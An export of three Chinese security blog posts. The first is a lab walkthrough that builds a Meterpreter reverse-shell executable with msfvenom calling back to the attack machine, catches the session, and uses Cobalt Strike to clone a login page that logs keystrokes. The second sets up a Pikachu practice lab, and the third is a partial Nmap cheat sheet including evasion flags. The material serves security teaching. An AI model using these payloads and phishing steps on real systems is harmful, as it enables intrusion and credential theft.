[{"content":"MSF恶意程序利用与CS钓鱼网站制作 目录 实践概览 MSFVenom Cobalt Strike 环境配置 实践步骤 MFS恶意程序利用 使用msfvenom制作恶意软件 制作监听程序 将恶意程序传输下载到靶机 等待靶机执行恶意程序 CS钓鱼网站制作 Cobalt Strike安装 更改CS读写权限 生成Cobalt Strike服务器组 打开Cobalt Strike客户端并连接服务器组 创建监听器 网站克隆与Web日志 靶机访问钓鱼网站 键盘记录 CS菜单功能概览 视图 攻击 实践概览 名称：MSF恶意程序利用与CS上线 目的：使用MSFVenom恶意软件获取shell；使用Cobalt Strike制作钓鱼网站并监听键盘 时间：2026年1月3日 风险说明：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试 MSFVenom 定义： msfvenom 是 Metasploit Framework 的一部分，它是一个独立的 攻击载荷生成器。它取代了旧版的 msfpayload 和 msfencode 工具，用于创建和编码各种格式的 shellcode 或可执行文件。\n主要功能：\n生成载荷： 可以生成适用于几乎所有操作系统（Windows, Linux, macOS, Android等）和架构（x86, x64, ARM等）的攻击载荷。 多种格式： 输出格式多样，如可执行文件（.exe, .elf）、动态链接库（.dll）、Web脚本（.php, .aspx）、Shell代码（C、Python、Ruby等格式的原始字节）等。 编码与规避： 内置多种编码器（如 x86/shikata_ga_nai），可以对生成的载荷进行混淆，以绕过基础的静态杀毒软件（AV）检测。 捆绑： 可以将攻击载荷与一个正常的合法程序（如计算器、PDF阅读器）捆绑在一起，诱骗目标运行。 转换格式： 可以将载荷在不同格式之间转换。 典型工作流程：\n红队人员决定攻击目标（例如：Windows 10 x64）。\n使用 msfvenom 命令生成一个反向 TCP 连接的 Windows 后门：\n1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击机 LPORT=4444 -f exe -o payload.exe 通过社会工程学（如钓鱼邮件）将 payload.exe 投递到目标机器。\n目标运行后，会在其机器上建立一个与攻击者 Metasploit 监听器（multi/handler）的连接。\n攻击者获得一个 Meterpreter shell，可以进行基本的后期利用。\n特点：\n免费且开源。 功能单一但强大，专注于载荷生成。 通常需要与 Metasploit Framework 的其他模块（如监听器、利用模块）配合使用。 在绕过现代EDR/AV方面能力有限，生成的载荷容易被高级安全软件检测。 Cobalt Strike 定义： Cobalt Strike 是一个 商业的、综合性的红队和对手模拟平台。它远不止一个载荷生成器，而是一个集成了 指挥与控制、钓鱼攻击、横向移动、权限提升、报告生成 等功能的完整作战系统。\n主要功能：\n高级攻击载荷： Beacon： Cobalt Strike 的核心载荷，是一个高度可定制的、隐蔽的“心跳”代理。支持多种通信协议（HTTP/HTTPS, DNS, SMB）和回调方式。 生成经过高度混淆、签名、或利用各种技术（如进程注入、模块反射式加载）的 Beacon 载荷，以绕过杀毒软件和终端检测与响应（EDR）。 图形化指挥与控制： 所有上线的被控主机（Beacon）都在一个直观的图形界面中显示，可以分组、打标签。 通过右键菜单或命令，轻松向任何 Beacon 发送指令（文件操作、截图、键盘记录、提权等）。 内网横向移动： 端口扫描和服务发现。 凭据转储（从内存中提取密码哈希和票据）。 哈希传递、票据传递 攻击。 SMB Beacon 用于穿透没有直接外网连接的内部网络节点。 鱼叉式网络钓鱼： 内置模板和服务器，可以方便地创建和管理钓鱼邮件活动，追踪点击和载荷执行情况。 Malleable C2 配置文件： 这是 Cobalt Strike 的灵魂功能。允许操作员 完全自定义 Beacon 的通信模式（如模拟成 Google、CloudFlare 等合法服务的流量），极大地增强了隐蔽性和对抗网络流量分析的能力。 团队协作： 支持多个操作员同时连接到一个团队服务器，协同工作。 报告与日志： 自动记录所有操作，便于生成最终的攻击报告。 典型工作流程：\n红队启动 Cobalt Strike 团队服务器。 操作员使用 Cobalt Strike 客户端 连接。 使用 “攻击”-\u0026gt;“生成Payload” 创建一个高度定制的 Beacon（例如，使用 Malleable C2 配置文件模拟正常流量）。 通过 鱼叉式钓鱼 或利用其他漏洞投递 Beacon。 目标上线后，在可视化地图上看到新主机。 操作员通过 Beacon 进行信息收集，利用内置工具进行凭据转储，然后在内网横向移动，逐步控制更多关键资产。 特点：\n商业软件，价格昂贵，但功能极其强大。 高度集成化和自动化，将红队行动的各个阶段无缝衔接。 以隐匿和对抗现代安全防御为核心设计。 是 高级持续性威胁（APT）模拟 和 成熟红队 的首选工具。 环境配置 虚拟环境：VMware Workstation 17 Pro - 17.0.0 build-20800274 靶机： 系统：Windows 7 Enterprise x64 CPU：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) 网络：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL） 攻击机： 系统：Linux kali 6.12.25-amd64 CPU：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz) 网络：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL） 实践步骤 MFS恶意程序利用 使用msfvenom制作恶意软件 1 2 3 4 5 6 7 ┌──(root㉿kali)-[~] └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.223 LPORT=4448 -f exe \u0026gt; Notice.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of exe file: 73802 bytes 文件存储于/root/Notice.exe\n制作监听程序 监听程序的制作过程与Metasploit持久化后门攻击相同：\n1 2 3 4 5 6 7 8 9 10 msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LHOST 10.0.0.223 LHOST =\u0026gt; 10.0.0.223 msf6 exploit(multi/handler) \u0026gt; set LPORT 4448 LPORT =\u0026gt; 4448 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.0.0.223:4448 将恶意程序传输下载到靶机 这里通过MS17-010漏洞与Metasploit实现恶意程序的upload:\n1 2 3 meterpreter \u0026gt; upload /root/Notice.exe \u0026gt; C:\\\\ [*] Uploading : /root/Notice.exe -\u0026gt; C:\\Notice.exe [*] Completed : /root/Notice.exe -\u0026gt; C:\\Notice.exe 等待靶机执行恶意程序 监听器获取到用户权限\n1 2 3 4 5 [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4448 -\u0026gt; 10.0.0.17:49864) at 2026-01-03 08:00:49 +0000 meterpreter \u0026gt; getuid Server username: Ankh-PC\\Ankh CS钓鱼网站制作 为了克隆网站，虚拟机需要联网。这里设置靶机和Kali的网络连接模式为NAT模式，两者通过DHCP自动获取IP地址。此时Win7的IP地址为192.168.10.147/24；Kali的IP地址为192.168.10.135/24。两者之间与宿主机相互ping通并可以正常访问互联网\nCobalt Strike安装 将cobalt_strike_4.5.zip下载至Kali并解压\n更改CS读写权限 1 2 3 4 5 ┌──(root㉿kali)-[/home/kali/Desktop/Tools/Cobalt Strike] └─# cd coablt_strike_4.5 ┌──(root㉿kali)-[/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] └─# chmod 777 * chmod = change mode（改变模式）\n777 = 权限的数字表示法\n第一个数字：文件所有者（owner）的权限\n第二个数字：所属用户组（group）的权限\n第三个数字：其他用户（others）的权限\n每个数字由三个权限值相加组成：\n4 = 读取权限（Read）\n2 = 写入权限（Write）\n1 = 执行权限（eXecute）\n777 的具体含义：7 = 4 + 2 + 1，即拥有所有权限\n所有者：读 + 写 + 执行（7）\n所属组：读 + 写 + 执行（7）\n其他用户：读 + 写 + 执行（7）\n生成Cobalt Strike服务器组 设置服务器IP和密码（CS服务器在kali的50050端口监听），创建组服务器实例\n1 2 3 4 5 6 ┌──(root㉿kali)-[/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] └─# ./teamserver 192.168.10.135 admin [*] Will use existing X509 certificate and keystore (for SSL) [+] Team server is up on 0.0.0.0:50050 [*] SHA256 hash of SSL cert is: 7eac4fdf25b2e55d39a7d9fcccc00978b95a7639a78a2c893bd2f6aac3637fb8 [+] Listener: Listener started! 打开Cobalt Strike客户端并连接服务器组 1 2 ┌──(root㉿kali)-[/home/…/Desktop/Tools/Cobalt Strike/coablt_strike_4.5] └─# ./cobaltstrike 打开Cobal Strike，用刚才设置的密码和IP连接到用户组。Cobalt Strike支持多设备同时登录服务器。\n创建监听器 打开监听器选项，点击添加\nHTTP地址为Kali地址，HTTP端口为钓鱼网站端口。添加监听器后，CS将在Kali的80端口上持续监听\n网站克隆与Web日志 “克隆URL”中填写要伪装的网站，这里只支持HTTP协议。“本地HOST”为本地Kali的IP地址，也是伪装网址的IP地址；“本地端口”为伪装网址的运行端口，与监听器相一致；开启键盘记录\n最终访问地址为http://192.168.10.135:80/。由于网络适配器为NAT模式。因此所有NAT连接的虚拟机以及宿主机都可访问该页面。\n打开Web日志。\n靶机访问钓鱼网站 在Win7的浏览器中访问伪装网址，输入Kali\n键盘记录 Web日志中打印Win7的键盘输入。该手段用于获取用户的密码等敏感信息。\nCS菜单功能概览 视图 此菜单主要用于管理和查看在后渗透阶段（Post-Exploitation）收集到的各类数据。\n应用程序 (Applications)：显示由“系统分析器（System Profiler）”收集到的目标浏览器信息，包括浏览器版本、Flash版本、Java版本等，帮助你判断目标有哪些可被利用的客户端漏洞。 密码凭证 (Credentials)：这是一个中央数据库，存储所有通过 hashdump、mimikatz 或钓鱼攻击获取到的用户名、密码、NTLM 哈希及令牌。 下载列表 (Downloads)：记录所有从受控主机下载到 Team Server 的文件。你可以在这里右键将文件保存到本地。 事件日志 (Event Log)：整个团队的“聊天室”和审计中心。记录了谁上线了、执行了什么关键命令，以及团队成员之间的即时消息沟通。 键盘记录 (Keystrokes)：集中展示通过 keylogger 命令抓取到的所有目标击键记录。 代理转发 (Proxy Pivots)：管理 SOCKS 代理和反向端口转发。当你想利用受控主机作为跳板攻击内网其他机器时，在这里配置代理信息。 屏幕截图 (Screenshots)：展示所有从 Beacon 发回的屏幕截图。支持缩略图预览，方便快速查看目标当前的操作界面。 脚本控制台 (Script Console)：用于加载和调试 Aggressor Script（CS 的自动化脚本语言）。你可以在这里看到脚本运行的输出或错误信息。 目标列表 (Targets)：列出当前网络中所有已知的计算机及其元数据（IP、系统版本等）。你可以通过扫描或导入方式增加目标。 Web日志 (Web Log)：记录 CS 内置 Web 服务器的所有访问请求。包括谁访问了你的钓鱼页面、下载了什么文件。 攻击 该菜单是 CS 的核心功能区，分为载荷生成、Web 渗透和邮件钓鱼三大类。\n生成后门 (Packages)\n用于创建各种形式的初始控制载荷（Payload）。\nHTA文档：生成 .hta 后缀的 HTML 应用程序。它常通过浏览器下载执行，利用 VBScript 或 JScript 在系统底层运行 Beacon。\nOffice宏：生成一段 VBA 代码，你可以将其嵌入 Word 或 Excel 文档中。当受害者点击“启用宏”时，就会触发上线。\nPayload生成器：最基础的工具。它可以将 Beacon 生成各种格式的原始数据（Raw Shellcode），或者生成 C、C#、Java、Python 等语言的源代码供你二次开发。\nWindows可执行程序：生成一个 Staged（分阶段）的 EXE 或 DLL 文件。这种后门体积小，运行时会先连接服务器下载完整的 Beacon。\nWindows可执行程序(Stageless)：生成一个 Stageless（不分阶段）的后门。它包含完整的 Beacon 功能，虽然体积较大，但在复杂的网络环境下更稳定且更难被流量监控发现。\nWeb钓鱼 (Web Drive-by)\n利用 CS 内置的 Web 服务器进行自动化 Web 攻击。\n站点管理 (Manage)：查看并管理当前所有正在运行的 Web 服务（克隆的页面、托管的文件等）。 网站克隆 (Clone Site)：输入一个网址（如公司内网登录页），CS 会克隆该页面。你还可以配置它抓取用户输入的表单数据（如账号密码）。 文件托管 (Host File)：简单的 Web 服务器功能，用于把你的木马或工具挂在网上供目标下载。 Web投递 (Web Delivery)：提供一种“一键上线”的方案。它生成一个 PowerShell、Python 或 Bitsadmin 命令，只要在目标机器运行这行命令，即可远程下载执行 Beacon。 签名/智能 Applet 攻击：利用旧版本 Java 的漏洞或诱导用户点击运行 Java 插件。注意：由于现代浏览器已不再支持 Java 插件，这些功能在实战中已基本过时。 信息收集 (System Profiler)：生成一个隐藏的探测链接。当用户点击时，它会静默收集该用户的系统环境信息，并存入“视图 -\u0026gt; 应用程序”中。 邮件钓鱼 (Spear Phish)\n这是一个专门的钓鱼邮件发送平台。\n导入邮件模板和目标邮箱列表。 配置 SMTP 发信服务器。 将上述“生成后门”或“Web钓鱼”生成的链接/附件自动注入邮件并群发。 ","date":"2026-01-03T13:48:09+08:00","image":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/CS_hu_1e29a32e1f5c7432.png","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5msf%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%E4%B8%8Ecs%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E5%88%B6%E4%BD%9C/","title":"【攻防实践】MSF恶意程序利用与CS钓鱼网站制作"},{"content":"靶场搭建 目录 靶场环境 Pikachu-Docker 安装Docker 配置Docker镜像 拉取Pikachu镜像 运行容器 持久化运行 靶场环境 Ubuntu 24.01 64bit\nPikachu-Docker 安装Docker 1 2 3 4 5 sudo apt update # 更新软件包列表 sudo install docker.io docker-compose -y # 安装Docker和Docker Compose sudo systemctl start docker # 启动Docker服务 sudo systemctl enable docker # 设置Docker开机自启动 docker --version # 查看Docker版本以验证安装 配置Docker镜像 编辑docker配置文件 1 sudo nano /etc/docker/daemon.json # 编辑Docekrs守护进程配置 添加镜像加速地址 1 2 3 4 5 6 7 { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://docker.1ms.run\u0026#34;, \u0026#34;https://docker-0.unsee.tech\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34; ] } // 写入国内镜像加速器 保存并重启Docker服务 1 2 sudo systemctl daemon-reload # 重新加载 systemd 守护进程配置 sudo systemctl restart docker # 重启 Docker 服务使配置生效 拉取Pikachu镜像 1 sudo docker pull area39/pikachu 运行容器 1 sudo docker run -d --name pikachu -p 8000:80 area39/pikachu 持久化运行 1 2 sudo docker stop pikachu sudo docker rm pikachu # 停止并删除容器 1 2 # 创建命名数据卷 sudo docker volume create pikachu_data 启动脚本（pikachu-start.bash）: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 #!/bin/bash # pikachu-manager.sh - Pikachu Docker 容器管理脚本 CONTAINER_NAME=\u0026#34;pikachu\u0026#34; IMAGE_NAME=\u0026#34;area39/pikachu\u0026#34; PORT=\u0026#34;8001:80\u0026#34; VOLUME_NAME=\u0026#34;pikachu_data\u0026#34; VOLUME_PATH=\u0026#34;/app/data\u0026#34; # 颜色定义 RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; YELLOW=\u0026#39;\\033[1;33m\u0026#39; BLUE=\u0026#39;\\033[0;34m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color show_usage() { echo -e \u0026#34;${BLUE}Pikachu 容器管理脚本${NC}\u0026#34; echo \u0026#34;用法: $0 [命令]\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;命令:\u0026#34; echo \u0026#34; start 启动容器\u0026#34; echo \u0026#34; stop 停止容器\u0026#34; echo \u0026#34; restart 重启容器\u0026#34; echo \u0026#34; status 查看容器状态\u0026#34; echo \u0026#34; logs 查看容器日志\u0026#34; echo \u0026#34; remove 删除容器（保留数据卷）\u0026#34; echo \u0026#34; purge 彻底删除（容器+数据卷）\u0026#34; echo \u0026#34; backup 备份数据卷\u0026#34; echo \u0026#34; shell 进入容器shell\u0026#34; echo \u0026#34;\u0026#34; } check_docker() { if ! command -v docker \u0026amp;\u0026gt; /dev/null; then echo -e \u0026#34;${RED}错误: Docker 未安装${NC}\u0026#34; exit 1 fi if ! sudo docker info \u0026amp;\u0026gt; /dev/null; then echo -e \u0026#34;${RED}错误: Docker 服务未运行或无权限${NC}\u0026#34; echo \u0026#34;请确保Docker服务正在运行，或使用sudo权限\u0026#34; exit 1 fi } start_container() { check_docker echo -e \u0026#34;${BLUE}正在启动 Pikachu 容器...${NC}\u0026#34; # 检查镜像是否存在，不存在则拉取 if ! sudo docker images | grep -q \u0026#34;$(echo $IMAGE_NAME | cut -d\u0026#39;:\u0026#39; -f1)\u0026#34;; then echo -e \u0026#34;${YELLOW}正在拉取镜像...${NC}\u0026#34; sudo docker pull ${IMAGE_NAME} fi # 检查是否已存在同名容器 if sudo docker ps -a --format \u0026#34;{{.Names}}\u0026#34; | grep -q \u0026#34;^${CONTAINER_NAME}$\u0026#34;; then if sudo docker ps --format \u0026#34;{{.Names}}\u0026#34; | grep -q \u0026#34;^${CONTAINER_NAME}$\u0026#34;; then echo -e \u0026#34;${YELLOW}容器已在运行中${NC}\u0026#34; return else echo -e \u0026#34;${YELLOW}发现停止的容器，正在启动...${NC}\u0026#34; sudo docker start ${CONTAINER_NAME} fi else # 创建数据卷（如果不存在） if ! sudo docker volume ls | grep -q ${VOLUME_NAME}; then echo -e \u0026#34;${YELLOW}创建数据卷: ${VOLUME_NAME}${NC}\u0026#34; sudo docker volume create ${VOLUME_NAME} fi # 运行新容器 sudo docker run -d \\ --name ${CONTAINER_NAME} \\ --restart unless-stopped \\ -p ${PORT} \\ -v ${VOLUME_NAME}:${VOLUME_PATH} \\ ${IMAGE_NAME} fi if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}✓ Pikachu 容器启动成功！${NC}\u0026#34; echo -e \u0026#34;${BLUE}容器信息:${NC}\u0026#34; echo \u0026#34; 名称: ${CONTAINER_NAME}\u0026#34; echo \u0026#34; 镜像: ${IMAGE_NAME}\u0026#34; echo \u0026#34; 端口: ${PORT}\u0026#34; echo \u0026#34; 数据卷: ${VOLUME_NAME}\u0026#34; echo -e \u0026#34;${BLUE}访问地址:${NC} http://localhost:8001\u0026#34; else echo -e \u0026#34;${RED}✗ 容器启动失败${NC}\u0026#34; exit 1 fi } stop_container() { check_docker echo -e \u0026#34;${YELLOW}正在停止容器...${NC}\u0026#34; sudo docker stop ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}✓ 容器已停止${NC}\u0026#34; else echo -e \u0026#34;${RED}✗ 停止容器失败${NC}\u0026#34; fi } restart_container() { check_docker echo -e \u0026#34;${YELLOW}正在重启容器...${NC}\u0026#34; sudo docker restart ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}✓ 容器已重启${NC}\u0026#34; else echo -e \u0026#34;${RED}✗ 重启容器失败${NC}\u0026#34; fi } show_status() { check_docker echo -e \u0026#34;${BLUE}容器状态:${NC}\u0026#34; sudo docker ps -a --filter \u0026#34;name=${CONTAINER_NAME}\u0026#34; --format \u0026#34;table {{.Names}}\\t{{.Status}}\\t{{.Ports}}\\t{{.Image}}\u0026#34; echo -e \u0026#34;\\n${BLUE}数据卷信息:${NC}\u0026#34; sudo docker volume ls --filter \u0026#34;name=${VOLUME_NAME}\u0026#34; echo -e \u0026#34;\\n${BLUE}资源使用情况:${NC}\u0026#34; sudo docker stats ${CONTAINER_NAME} --no-stream --format \u0026#34;table {{.Name}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\\t{{.NetIO}}\\t{{.BlockIO}}\u0026#34; } show_logs() { check_docker echo -e \u0026#34;${BLUE}容器日志 (最后50行):${NC}\u0026#34; sudo docker logs --tail 50 ${CONTAINER_NAME} } remove_container() { check_docker echo -e \u0026#34;${YELLOW}正在删除容器...${NC}\u0026#34; sudo docker rm ${CONTAINER_NAME} if [ $? -eq 0 ]; then echo -e \u0026#34;${GREEN}✓ 容器已删除（数据卷保留）${NC}\u0026#34; else echo -e \u0026#34;${RED}✗ 删除容器失败${NC}\u0026#34; fi } purge_all() { check_docker echo -e \u0026#34;${RED}警告: 这将删除容器和数据卷！${NC}\u0026#34; read -p \u0026#34;确认删除？(y/N): \u0026#34; confirm if [[ $confirm =~ ^[Yy]$ ]]; then echo -e \u0026#34;${YELLOW}正在删除容器...${NC}\u0026#34; sudo docker rm -f ${CONTAINER_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${YELLOW}正在删除数据卷...${NC}\u0026#34; sudo docker volume rm ${VOLUME_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${GREEN}✓ 容器和数据卷已彻底删除${NC}\u0026#34; else echo -e \u0026#34;${YELLOW}操作已取消${NC}\u0026#34; fi } backup_volume() { check_docker BACKUP_DIR=\u0026#34;./backups\u0026#34; BACKUP_FILE=\u0026#34;pikachu_backup_$(date +%Y%m%d_%H%M%S).tar.gz\u0026#34; mkdir -p ${BACKUP_DIR} echo -e \u0026#34;${BLUE}正在备份数据卷...${NC}\u0026#34; # 停止容器以确保数据一致性 sudo docker stop ${CONTAINER_NAME} 2\u0026gt;/dev/null # 创建备份 sudo docker run --rm \\ -v ${VOLUME_NAME}:/source \\ -v ${BACKUP_DIR}:/backup \\ alpine tar czf /backup/${BACKUP_FILE} -C /source . # 重新启动容器 sudo docker start ${CONTAINER_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${GREEN}✓ 备份完成: ${BACKUP_DIR}/${BACKUP_FILE}${NC}\u0026#34; ls -lh ${BACKUP_DIR}/${BACKUP_FILE} } enter_shell() { check_docker echo -e \u0026#34;${BLUE}进入容器Shell...${NC}\u0026#34; echo -e \u0026#34;${YELLOW}按 Ctrl+D 或输入 exit 退出${NC}\u0026#34; sudo docker exec -it ${CONTAINER_NAME} /bin/sh } # 主程序 case \u0026#34;$1\u0026#34; in start) start_container ;; stop) stop_container ;; restart) restart_container ;; status) show_status ;; logs) show_logs ;; remove) remove_container ;; purge) purge_all ;; backup) backup_volume ;; shell) enter_shell ;; *) show_usage exit 1 ;; esac ","date":"2026-01-03T12:33:34+08:00","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","title":"【攻防实践】靶场搭建"},{"content":"Nmap：网络扫描工具 目录 目标选择与管理 -iL -iR --exclude --excludefile --resume 主机发现与存活探测 -sn -sP -Pn -PS -PA -PU -PI -P0 端口扫描技术 -sS -sT -sU -sN -sF -sX -sI 端口规范 -p -p- --top-ports -F 服务和版本探测 -sV --version-intensity 操作系统探测 -O -A NSE 脚本引擎 -sC / --script=default -script=\u0026lt;Lua scripts\u0026gt; -script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt; –script-args-file=filename –script-trace –script-updatedb –script-help=\u0026lt;scripts\u0026gt; 输出格式与详情 -oN -oX -oA --append-output -v / -vv / -d / -dd 扫描结果筛选与解释 --open --reason 调试与信息收集 --packet-trace --iflist --traceroute 网络与DNS配置 -n -R --system-dns -e -6 性能与定时控制 -T\u0026lt;0-5\u0026gt; --min-rate --max-rate --scan-delay --min-parallelism / --max-parallelism --max-retries 防火墙/IDS规避与欺骗 -f -D --source-port --data-length --ttl --spoof-mac --badsum 权限与运行模式 --privileged / --unprivileged 附件 nmap.pdf 目标选择与管理 -iL 功能：指定扫描主机列表\n示例：nmap -iL targets.txt\ntargets.txt内容示例：\n1 2 3 192.168.1.100 192.168.1.101 scanme.nmap.org -iR 功能：随机选择扫描目标。随机扫描10个IP地址 示例：nmap -iR 10 -Pn --exclude 功能：排除扫描目标 示例：nmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101 --excludefile 功能：排除文件中目标列表 示例：nmap 192.168.1.0/24 --excludefile exclude.txt --resume 功能：从上次中断的地方继续扫描。 示例：nmap --resume scan.log 主机发现与存活探测 -sn 功能：探测主机是否在线，不扫描端口 示例：nmap -sn 192.168.1.0/24 -sP 功能：存活主机探测（已被-sn取代） 示例：nmap -sP 192.168.1.0/24 -Pn 功能：跳过主机发现，将所有主机视为在线状态 示例：nmap -Pn 192.168.1.100 -PS 功能：指定端口号，TCP SYN ping扫描。向指定端口发送SYN包进行主机发现 示例：nmap -PS 80,443 192.168.1.0/24 -PA 功能：指定端口号，TCP ACK ping扫描。向指定端口发送ACK包，常用于穿透防火墙 示例：nmap -PA 80,443 192.168.1.0/24 -PU 功能：指定端口号，UDP ping扫描。向目标UDP端口发送空包，根据响应判断主机是否在线 示例：nmap -PU 53,161 192.168.1.0/24 -PI 功能：指定端口号，使用真正的ping ICMP echo请求扫描目标主机是否正在运行 示例：nmap -PI 192.168.1.0/24 -P0 功能：指定端口号，无ping扫描。此参数已过时，使用-Pn替代 示例：nmap -P0 192.168.1.100 端口扫描技术 -sS 功能：TCP SYN半开扫描，相对隐蔽 示例：nmap -sS 192.168.1.100 -sT 功能：TCP全开扫描，建立完整的TCP链接，更容易被发现 示例：nmap -sT -p- 192.168.1.100 -sU 功能：UDP端口扫描 示例：nmap -sU 192.168.1.100 -sN 功能：TCP Null扫描，发送没有任何标志位的TCP包 示例：nmap -sN 192.168.1.100 -sF 功能：TCP FIN扫描，发送FIN标志位的TCP包 示例：nmap -sF 192.168.1.100 -sX 功能：TCP Xmas扫描，发送FIN、PSH和URG标志位的TCP包 示例：nmap -sX 192.168.1.100 -sI 功能：空闲扫描，通过“僵尸主机”进行隐蔽扫描 示例：nmap -sI zombiehost:port target 端口规范 -p 功能：指定端口号 示例：nmap -p 1-80 192.168.1.100、nmap -p 80,443 192.168.1.100 -p- 功能：扫描所有端口 示例：nmap -p- 192.168.1.100 --top-ports 功能：扫描最常用的前指定数量的端口 示例：nmap --top-ports 100 192.168.1.100 -F 功能：快速扫描，减少扫描的端口数量 示例：nmap -F 192.168.1.100 服务和版本探测 -sV 功能：识别服务类型（HTTP、FTP等）和服务版本号，获取详细服务信息 示例：nmap -sV 192.168.1.100 --version-intensity 功能：指定版本探测强度（0-9） 示例：nmap -sV --version-intensity 9 192.168.1.100 操作系统探测 -O 功能：探测目标主机的操作系统类型 示例：nmap -O 192.168.1.100 -A 功能：启用操作系统检测、版本检测、脚本扫描和路由追踪（聚合功能） 示例：nmap -A 192.168.1.100 NSE 脚本引擎 -sC / --script=default 功能：使用默认脚本进行扫描 示例：nmap -sC 192.168.1.100 -script=\u0026lt;Lua scripts\u0026gt; 功能：使用某个或某类脚本进行扫描，支持通配符描述 示例：nmap -script=vuln 192.168.1.100 脚本分类： auth: 负责处理鉴权证书（绕开鉴权）的脚本 broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 brute: 提供暴力破解方式，针对常见的应用如http/snmp等 default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等 dos: 用于进行拒绝服务攻击 exploit: 利用已知的漏洞入侵系统 external: 利用第三方的数据库或资源，例如进行whois解析 fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 malware: 探测目标机是否感染了病毒、开启了后门等信息 safe: 此类与intrusive相反，属于安全性脚本 version: 负责增强服务与版本扫描（Version Detection）功能的脚本 vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 -script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt; 功能：为脚本提供默认参数，使用指定类别或脚本进行扫描 示例：nmap --script http-title --script-args http.useragent=\u0026quot;Mozilla/5.0\u0026quot; 192.168.1.100 –script-args-file=filename 功能：使用文件来为脚本提供参数\n示例：nmap --script smb-enum-shares --script-args-file smb-args.txt 192.168.1.100\nsmb-args.txt内容\n1 2 smbuser=admin smbpass=password123 –script-trace 功能：显示脚本执行过程中发送与接收的数据 示例：nmap -O -script-trace 192.168.1.100 –script-updatedb 功能：更新脚本数据库（root） 示例：nmap –script-updatedb –script-help=\u0026lt;scripts\u0026gt; 功能：显示脚本的帮助信息，其中部分可以逗号分隔的文件或脚本类别。查看所有http漏洞相关脚本的帮助信息： 示例：nmap -script-help http-vuln-* 输出格式与详情 -oN 功能：输出至普通文本文件 示例：nmap -oN result.txt 192.168.1.100 -oX 功能：输出至XML文件，便于工具处理 示例：nmap -oX result.xml 192.168.1.100 -oA 功能：一次性输出所有主要格式 示例：nmap -oA result 192.168.1.100 --append-output 功能：追加输出，追加到现有日志文件而不是覆盖。 示例：nmap -oN scan.log --append-output 192.168.1.100 -v / -vv / -d / -dd 功能：详细/调试输出\n示例：\n1 2 3 4 nmap -v 192.168.1.100 # 详细输出 nmap -vv 192.168.1.100 # 更详细 nmap -d 192.168.1.100 # 调试级别1 nmap -dd 192.168.1.100 # 